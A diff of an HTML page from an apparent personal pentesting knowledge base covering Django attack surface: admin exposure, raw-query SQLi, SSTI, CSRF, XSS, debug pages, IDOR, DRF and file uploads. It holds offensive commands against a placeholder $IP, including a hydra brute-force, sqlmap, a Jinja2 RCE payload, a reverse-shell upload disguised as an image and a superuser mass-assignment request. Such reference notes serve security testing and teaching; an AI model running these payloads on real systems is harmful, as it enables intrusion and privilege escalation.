@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:54 -->
+<!-- 2026-07-30 Thu 22:12 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Django Django</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,24 +886,24 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org7ed4e19">Components</a></li>
-<li><a href="#orgb64b225">Architecture</a></li>
-<li><a href="#org4f76a56">Attack Surface</a>
+<li><a href="#org7a22b02">Components</a></li>
+<li><a href="#org2933935">Architecture</a></li>
+<li><a href="#org4773156">Attack Surface</a>
 <ul>
-<li><a href="#org34b261e">Django Admin — Default Exposed Interface</a></li>
-<li><a href="#orgf5c3b46">SQL Injection — Raw Queries</a></li>
-<li><a href="#org78152fe">Server-Side Template Injection (SSTI)</a></li>
-<li><a href="#org38c86ac">CSRF</a></li>
-<li><a href="#orga19fdbd">XSS — Template Auto-escaping Disabled</a></li>
-<li><a href="#orga348e38">Debug Mode — Information Disclosure</a></li>
-<li><a href="#org76d2397">Insecure Direct Object References</a></li>
-<li><a href="#orgd09a98c">Django REST Framework — Browsable API</a></li>
-<li><a href="#org011de33">File Upload</a></li>
-<li><a href="#org53f5760">Mass Assignment via RF Serialisers</a></li>
+<li><a href="#orgfa4999f">Django Admin — Default Exposed Interface</a></li>
+<li><a href="#org0cedc86">SQL Injection — Raw Queries</a></li>
+<li><a href="#org1d20171">Server-Side Template Injection (SSTI)</a></li>
+<li><a href="#org79b4287">CSRF</a></li>
+<li><a href="#org0821a98">XSS — Template Auto-escaping Disabled</a></li>
+<li><a href="#org89de1b2">Debug Mode — Information Disclosure</a></li>
+<li><a href="#orgbd120a2">Insecure Direct Object References</a></li>
+<li><a href="#org7bb5835">Django REST Framework — Browsable API</a></li>
+<li><a href="#org34c489e">File Upload</a></li>
+<li><a href="#orgf736c65">Mass Assignment via RF Serialisers</a></li>
 </ul>
 </li>
-<li><a href="#org6d55f02">Enumeration Tips</a></li>
-<li><a href="#org3573ce8">Tips</a></li>
+<li><a href="#org81df50b">Enumeration Tips</a></li>
+<li><a href="#org4d44c9f">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -909,9 +927,9 @@ Related: <a href="20260611T064753--web-application-testing-methodology__cybersec
          <a href="20260207T065314--cross-site-scripting__cybersecurity_technique.html">XSS</a>
          <a href="20260213T071848==csrf--cross-site-request-forgery__cybersecurity_technique.html">CSRF</a>
 </p>
-<div id="outline-container-org7ed4e19" class="outline-2">
-<h2 id="org7ed4e19">Components</h2>
-<div class="outline-text-2" id="text-org7ed4e19">
+<div id="outline-container-org7a22b02" class="outline-2">
+<h2 id="org7a22b02">Components</h2>
+<div class="outline-text-2" id="text-org7a22b02">
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
@@ -969,10 +987,10 @@ Related: <a href="20260611T064753--web-application-testing-methodology__cybersec
 </table>
 </div>
 </div>
-<div id="outline-container-orgb64b225" class="outline-2">
-<h2 id="orgb64b225">Architecture</h2>
-<div class="outline-text-2" id="text-orgb64b225">
-<pre class="example" id="orgb58fd37">
+<div id="outline-container-org2933935" class="outline-2">
+<h2 id="org2933935">Architecture</h2>
+<div class="outline-text-2" id="text-org2933935">
+<pre class="example" id="orgc9b5a91">
 Browser → Nginx → Gunicorn → Django (urls.py → views.py → models.py) → Database
 </pre>
 
@@ -984,13 +1002,13 @@ Templates handle HTML rendering server-side. DDjango REST Framework
 </p>
 </div>
 </div>
-<div id="outline-container-org4f76a56" class="outline-2">
-<h2 id="org4f76a56">Attack Surface</h2>
-<div class="outline-text-2" id="text-org4f76a56">
+<div id="outline-container-org4773156" class="outline-2">
+<h2 id="org4773156">Attack Surface</h2>
+<div class="outline-text-2" id="text-org4773156">
 </div>
-<div id="outline-container-org34b261e" class="outline-3">
-<h3 id="org34b261e">Django Admin — Default Exposed Interface</h3>
-<div class="outline-text-3" id="text-org34b261e">
+<div id="outline-container-orgfa4999f" class="outline-3">
+<h3 id="orgfa4999f">Django Admin — Default Exposed Interface</h3>
+<div class="outline-text-3" id="text-orgfa4999f">
 <p>
 Django ships with a powerful admin interface at <code>/admin/</code> by
 default. It is frequently left enabled in production with weak
@@ -998,11 +1016,11 @@ or default credentials.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_97585552462c4df39f183c11d5005a40>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_55687edf819a459995f70b1ff926657f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_97585552462c4df39f183c11d5005a40=document.querySelector('button[name=btn_97585552462c4df39f183c11d5005a40]');
-copyBtnbtn_97585552462c4df39f183c11d5005a40.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl http://$IP/admin/\n`);copyBtnbtn_97585552462c4df39f183c11d5005a40.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_97585552462c4df39f183c11d5005a40.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_55687edf819a459995f70b1ff926657f=document.querySelector('button[name=btn_55687edf819a459995f70b1ff926657f]');
+copyBtnbtn_55687edf819a459995f70b1ff926657f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl http://$IP/admin/\n`);copyBtnbtn_55687edf819a459995f70b1ff926657f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_55687edf819a459995f70b1ff926657f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1016,11 +1034,11 @@ lockout is not enabled by default:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ea623e19aeaf4420aad3fac878ddeccc>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f0db8978e47849babce7ad7eed708de6>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ea623e19aeaf4420aad3fac878ddeccc=document.querySelector('button[name=btn_ea623e19aeaf4420aad3fac878ddeccc]');
-copyBtnbtn_ea623e19aeaf4420aad3fac878ddeccc.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  http-post-form \\\n  \"$IP/admin/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=<token>:Please enter the correct\"\n`);copyBtnbtn_ea623e19aeaf4420aad3fac878ddeccc.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ea623e19aeaf4420aad3fac878ddeccc.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f0db8978e47849babce7ad7eed708de6=document.querySelector('button[name=btn_f0db8978e47849babce7ad7eed708de6]');
+copyBtnbtn_f0db8978e47849babce7ad7eed708de6.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  http-post-form \\\n  \"$IP/admin/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=<token>:Please enter the correct\"\n`);copyBtnbtn_f0db8978e47849babce7ad7eed708de6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f0db8978e47849babce7ad7eed708de6.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1036,15 +1054,15 @@ from the login page first and include it in the Hydra form string.
 </p>
 </div>
 </div>
-<div id="outline-container-orgf5c3b46" class="outline-3">
-<h3 id="orgf5c3b46">SQL Injection — Raw Queries</h3>
-<div class="outline-text-3" id="text-orgf5c3b46">
+<div id="outline-container-org0cedc86" class="outline-3">
+<h3 id="org0cedc86">SQL Injection — Raw Queries</h3>
+<div class="outline-text-3" id="text-org0cedc86">
 <p>
 Django's ORM parameterises queries by default, making standard
 SQLi difficult. However, raw queries bypass this protection:
 </p>
 
-<pre class="example" id="org89c538f">
+<pre class="example" id="org97df7fe">
 # Vulnerable
 User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
 
@@ -1058,11 +1076,11 @@ in performance-sensitive code paths:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7fdead9471fc4225bee5c1c6212224e5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a4bcf2ab9e2d4cccade5abe079821b07>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7fdead9471fc4225bee5c1c6212224e5=document.querySelector('button[name=btn_7fdead9471fc4225bee5c1c6212224e5]');
-copyBtnbtn_7fdead9471fc4225bee5c1c6212224e5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sqlmap -u \"http://$IP/search/?q=test\" --dbs\n`);copyBtnbtn_7fdead9471fc4225bee5c1c6212224e5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7fdead9471fc4225bee5c1c6212224e5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a4bcf2ab9e2d4cccade5abe079821b07=document.querySelector('button[name=btn_a4bcf2ab9e2d4cccade5abe079821b07]');
+copyBtnbtn_a4bcf2ab9e2d4cccade5abe079821b07.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sqlmap -u \"http://$IP/search/?q=test\" --dbs\n`);copyBtnbtn_a4bcf2ab9e2d4cccade5abe079821b07.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a4bcf2ab9e2d4cccade5abe079821b07.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1071,9 +1089,9 @@ let res = copyTextToClipboard(`sqlmap -u \"http://$IP/search/?q=test\" --dbs\n`)
 </div></div>
 </div>
 </div>
-<div id="outline-container-org78152fe" class="outline-3">
-<h3 id="org78152fe">Server-Side Template Injection (SSTI)</h3>
-<div class="outline-text-3" id="text-org78152fe">
+<div id="outline-container-org1d20171" class="outline-3">
+<h3 id="org1d20171">Server-Side Template Injection (SSTI)</h3>
+<div class="outline-text-3" id="text-org1d20171">
 <p>
 Django uses its own template engine which is sandboxed and
 generally safe. However, applications sometimes use Jinja2
@@ -1081,11 +1099,11 @@ instead, which is exploitable.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e85ff603c4534aed967801f9e6227fde>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_26a0feb0a92c404196911e3b4997795e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e85ff603c4534aed967801f9e6227fde=document.querySelector('button[name=btn_e85ff603c4534aed967801f9e6227fde]');
-copyBtnbtn_e85ff603c4534aed967801f9e6227fde.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Test for SSTI\ncurl \"http://$IP/page/?name={{7*7}}\"\n`);copyBtnbtn_e85ff603c4534aed967801f9e6227fde.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e85ff603c4534aed967801f9e6227fde.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_26a0feb0a92c404196911e3b4997795e=document.querySelector('button[name=btn_26a0feb0a92c404196911e3b4997795e]');
+copyBtnbtn_26a0feb0a92c404196911e3b4997795e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Test for SSTI\ncurl \"http://$IP/page/?name={{7*7}}\"\n`);copyBtnbtn_26a0feb0a92c404196911e3b4997795e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_26a0feb0a92c404196911e3b4997795e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1099,14 +1117,14 @@ If the response contains <code>49</code>, SSTI is confirmed. Jinja2 SSTI
 can lead to RCE via Python object traversal:
 </p>
 
-<pre class="example" id="org9d3ec5d">
+<pre class="example" id="org5c7bbe8">
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 </pre>
 </div>
 </div>
-<div id="outline-container-org38c86ac" class="outline-3">
-<h3 id="org38c86ac">CSRF</h3>
-<div class="outline-text-3" id="text-org38c86ac">
+<div id="outline-container-org79b4287" class="outline-3">
+<h3 id="org79b4287">CSRF</h3>
+<div class="outline-text-3" id="text-org79b4287">
 <p>
 Django includes CSRF protection by default via a middleware and
 template tag. Common bypasses:
@@ -1125,15 +1143,15 @@ the request succeeds. See <a href="20260213T071848==csrf--cross-site-request-for
 </p>
 </div>
 </div>
-<div id="outline-container-orga19fdbd" class="outline-3">
-<h3 id="orga19fdbd">XSS — Template Auto-escaping Disabled</h3>
-<div class="outline-text-3" id="text-orga19fdbd">
+<div id="outline-container-org0821a98" class="outline-3">
+<h3 id="org0821a98">XSS — Template Auto-escaping Disabled</h3>
+<div class="outline-text-3" id="text-org0821a98">
 <p>
 Django templates auto-escape output by default. Escaping can
 be disabled with the <code>safe</code> filter or <code>{% autoescape off %}</code>:
 </p>
 
-<pre class="example" id="org293f94a">
+<pre class="example" id="org8b1928b">
 {{ user_input|safe }}
 {% autoescape off %}{{ user_input }}{% endautoescape %}
 </pre>
@@ -1145,9 +1163,9 @@ See <a href="20260207T065314--cross-site-scripting__cybersecurity_technique.html
 </p>
 </div>
 </div>
-<div id="outline-container-orga348e38" class="outline-3">
-<h3 id="orga348e38">Debug Mode — Information Disclosure</h3>
-<div class="outline-text-3" id="text-orga348e38">
+<div id="outline-container-org89de1b2" class="outline-3">
+<h3 id="org89de1b2">Debug Mode — Information Disclosure</h3>
+<div class="outline-text-3" id="text-org89de1b2">
 <p>
 Django's debug mode exposes detailed error pages including full
 stack traces, local variables, settings values, and installed
@@ -1158,11 +1176,11 @@ apps. It should never be enabled in production.
 Trigger an error to check:
 </p>
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0b0daf7913004a80947c902856ad3f03>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8d8187909f114a6a9183be255beabdc5>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0b0daf7913004a80947c902856ad3f03=document.querySelector('button[name=btn_0b0daf7913004a80947c902856ad3f03]');
-copyBtnbtn_0b0daf7913004a80947c902856ad3f03.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl \"http://$IP/nonexistent-path-that-causes-404\"\ncurl \"http://$IP/?id='\"\n`);copyBtnbtn_0b0daf7913004a80947c902856ad3f03.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0b0daf7913004a80947c902856ad3f03.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8d8187909f114a6a9183be255beabdc5=document.querySelector('button[name=btn_8d8187909f114a6a9183be255beabdc5]');
+copyBtnbtn_8d8187909f114a6a9183be255beabdc5.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl \"http://$IP/nonexistent-path-that-causes-404\"\ncurl \"http://$IP/?id='\"\n`);copyBtnbtn_8d8187909f114a6a9183be255beabdc5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8d8187909f114a6a9183be255beabdc5.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1182,13 +1200,13 @@ A Django debug error page reveals:
 </ul>
 </div>
 </div>
-<div id="outline-container-org76d2397" class="outline-3">
-<h3 id="org76d2397">Insecure Direct Object References</h3>
-<div class="outline-text-3" id="text-org76d2397">
+<div id="outline-container-orgbd120a2" class="outline-3">
+<h3 id="orgbd120a2">Insecure Direct Object References</h3>
+<div class="outline-text-3" id="text-orgbd120a2">
 <p>
 Django views commonly use integer primary keys in URLs:
 </p>
-<pre class="example" id="org0c81733">
+<pre class="example" id="orgd27263d">
 /api/users/1/
 /api/orders/42/
 </pre>
@@ -1199,9 +1217,9 @@ per endpoint. See <a href="20260207T065343==idor--insecure-direct-object-referen
 </p>
 </div>
 </div>
-<div id="outline-container-orgd09a98c" class="outline-3">
-<h3 id="orgd09a98c">Django REST Framework — Browsable API</h3>
-<div class="outline-text-3" id="text-orgd09a98c">
+<div id="outline-container-org7bb5835" class="outline-3">
+<h3 id="org7bb5835">Django REST Framework — Browsable API</h3>
+<div class="outline-text-3" id="text-org7bb5835">
 <p>
 DRF includes a browsable HTML API interface enabled by default.
 It may expose endpoints and their accepted parameters without
@@ -1209,11 +1227,11 @@ authentication:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0b13c621ebf44edc918cd4f764d3e2eb>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ea50b66dd3d648409f8b6f4c6edd991e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0b13c621ebf44edc918cd4f764d3e2eb=document.querySelector('button[name=btn_0b13c621ebf44edc918cd4f764d3e2eb]');
-copyBtnbtn_0b13c621ebf44edc918cd4f764d3e2eb.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl -H \"Accept: text/html\" http://$IP/api/\n`);copyBtnbtn_0b13c621ebf44edc918cd4f764d3e2eb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0b13c621ebf44edc918cd4f764d3e2eb.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ea50b66dd3d648409f8b6f4c6edd991e=document.querySelector('button[name=btn_ea50b66dd3d648409f8b6f4c6edd991e]');
+copyBtnbtn_ea50b66dd3d648409f8b6f4c6edd991e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl -H \"Accept: text/html\" http://$IP/api/\n`);copyBtnbtn_ea50b66dd3d648409f8b6f4c6edd991e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ea50b66dd3d648409f8b6f4c6edd991e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1226,7 +1244,7 @@ Also check DRF permission classes — <code>AllowAny</code> on sensitive
 endpoints is a common misconfiguration:
 </p>
 
-<pre class="example" id="orgf6db4c6">
+<pre class="example" id="orge873077">
 # Overly permissive
 permission_classes = [AllowAny]
 
@@ -1235,9 +1253,9 @@ permission_classes = [IsAuthenticated]
 </pre>
 </div>
 </div>
-<div id="outline-container-org011de33" class="outline-3">
-<h3 id="org011de33">File Upload</h3>
-<div class="outline-text-3" id="text-org011de33">
+<div id="outline-container-org34c489e" class="outline-3">
+<h3 id="org34c489e">File Upload</h3>
+<div class="outline-text-3" id="text-org34c489e">
 <p>
 Django handles file uploads via <code>FileField</code> and <code>ImageField</code>.
 Common issues:
@@ -1251,11 +1269,11 @@ accessible via browser</li>
 </ul>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_bc566e13ff0e4f0ab9b2a6d90f8cfb76>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_aad0f317406b4db1aff5ac2a16c9c77f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_bc566e13ff0e4f0ab9b2a6d90f8cfb76=document.querySelector('button[name=btn_bc566e13ff0e4f0ab9b2a6d90f8cfb76]');
-copyBtnbtn_bc566e13ff0e4f0ab9b2a6d90f8cfb76.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Try uploading a Python reverse shell disguised as an image\ncurl -X POST http://$IP/upload/ \\\n  -F \"file=@shell.py;type=image/jpeg\"\n`);copyBtnbtn_bc566e13ff0e4f0ab9b2a6d90f8cfb76.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bc566e13ff0e4f0ab9b2a6d90f8cfb76.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_aad0f317406b4db1aff5ac2a16c9c77f=document.querySelector('button[name=btn_aad0f317406b4db1aff5ac2a16c9c77f]');
+copyBtnbtn_aad0f317406b4db1aff5ac2a16c9c77f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Try uploading a Python reverse shell disguised as an image\ncurl -X POST http://$IP/upload/ \\\n  -F \"file=@shell.py;type=image/jpeg\"\n`);copyBtnbtn_aad0f317406b4db1aff5ac2a16c9c77f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_aad0f317406b4db1aff5ac2a16c9c77f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1266,20 +1284,20 @@ let res = copyTextToClipboard(`# Try uploading a Python reverse shell disguised 
 </div></div>
 </div>
 </div>
-<div id="outline-container-org53f5760" class="outline-3">
-<h3 id="org53f5760">Mass Assignment via RF Serialisers</h3>
-<div class="outline-text-3" id="text-org53f5760">
+<div id="outline-container-orgf736c65" class="outline-3">
+<h3 id="orgf736c65">Mass Assignment via RF Serialisers</h3>
+<div class="outline-text-3" id="text-orgf736c65">
 <p>
 DRF serialisers can expose writable fields that should be
 read-only. Test by sending extra fields in POST/PUT requests:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e8df52233063494bbf309ad45609909a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b0bffd9ecb2a4f1a80a42e95dc69eb94>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e8df52233063494bbf309ad45609909a=document.querySelector('button[name=btn_e8df52233063494bbf309ad45609909a]');
-copyBtnbtn_e8df52233063494bbf309ad45609909a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl -X PATCH http://$IP/api/users/1/ \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"is_staff\":true,\"is_superuser\":true}'\n`);copyBtnbtn_e8df52233063494bbf309ad45609909a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e8df52233063494bbf309ad45609909a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b0bffd9ecb2a4f1a80a42e95dc69eb94=document.querySelector('button[name=btn_b0bffd9ecb2a4f1a80a42e95dc69eb94]');
+copyBtnbtn_b0bffd9ecb2a4f1a80a42e95dc69eb94.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl -X PATCH http://$IP/api/users/1/ \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"is_staff\":true,\"is_superuser\":true}'\n`);copyBtnbtn_b0bffd9ecb2a4f1a80a42e95dc69eb94.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b0bffd9ecb2a4f1a80a42e95dc69eb94.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1292,9 +1310,9 @@ let res = copyTextToClipboard(`curl -X PATCH http://$IP/api/users/1/ \\\n  -H \"
 </div>
 </div>
 </div>
-<div id="outline-container-org6d55f02" class="outline-2">
-<h2 id="org6d55f02">Enumeration Tips</h2>
-<div class="outline-text-2" id="text-org6d55f02">
+<div id="outline-container-org81df50b" class="outline-2">
+<h2 id="org81df50b">Enumeration Tips</h2>
+<div class="outline-text-2" id="text-org81df50b">
 <ul class="org-ul">
 <li>Always check <code>/admin/</code> — it is present by default</li>
 <li>Check <code>/api/</code> and <code>/api/v1/</code> for DRF endpoints</li>
@@ -1309,9 +1327,9 @@ populate these automatically</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org3573ce8" class="outline-2">
-<h2 id="org3573ce8">Tips</h2>
-<div class="outline-text-2" id="text-org3573ce8">
+<div id="outline-container-org4d44c9f" class="outline-2">
+<h2 id="org4d44c9f">Tips</h2>
+<div class="outline-text-2" id="text-org4d44c9f">
 <ul class="org-ul">
 <li>Debug mode is the highest-value finding in a Django app —
 always try to trigger error pages</li>
@@ -1329,6 +1347,20 @@ configured — common in CTFs</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1336,6 +1368,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
